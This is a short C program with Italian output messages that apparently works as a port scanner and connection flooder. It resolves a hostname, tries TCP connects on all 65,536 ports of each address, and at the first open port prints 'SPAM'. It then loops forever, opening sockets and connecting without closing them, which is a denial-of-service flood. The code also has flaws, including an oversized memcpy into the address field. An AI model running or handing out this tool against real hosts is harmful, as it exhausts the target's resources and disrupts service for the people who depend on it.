#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <errno.h>
#include <time.h>


int main() {
char nomesrv[30];
struct sockaddr_in *p;
int i=0;
struct timeval tempo1;
printf("\nIns nome server\n");
fgets(nomesrv,30,stdin);
nomesrv[strlen(nomesrv)-1]='\0';
struct sockaddr_in servind;
bzero(&servind,sizeof(servind));
struct hostent *query;
int connsfd,j;

if((query=gethostbyname(nomesrv))==NULL)
    {printf("\nErrore gethostbyname -->%s",hstrerror(h_errno)); exit(1);}
else printf("\nQuery andata a buon fine\n");
printf("\nofficial host name: -->%s",query->h_name);
while(*(query->h_aliases+i)!=NULL){
        printf("\nalias: %s", *(query->h_aliases+i));
        i++;

}
i=0;
char str[INET_ADDRSTRLEN];
while(  *(query->h_addr_list+i)!=NULL      ){

        printf("\nIP %s",  inet_ntop(AF_INET,*(query->h_addr_list+i),str,INET_ADDRSTRLEN));

        bzero(&servind,sizeof(servind));
        memcpy(&(servind.sin_addr),*(query->h_addr_list+i),sizeof(*(query->h_addr_list+i)));
        servind.sin_family=AF_INET;
        for(j=0;j<65536;j++) {

                servind.sin_port=htons(j);
                connsfd=socket(AF_INET,SOCK_STREAM,0);
                if(connect(connsfd,(struct sockaddr *)&servind,sizeof(servind))>=0){
                    printf("\nLa porta %d e' aperta\n",j);
                    fflush(stdout);

                    close(connsfd);
                    printf("\nSPAM\n");fflush(stdout);
                    for(;;) {
                                connsfd=socket(AF_INET,SOCK_STREAM,0);
                                connect(connsfd,(struct sockaddr *)&servind,sizeof(servind));

                    }
                }

        }


        i++;

}








}
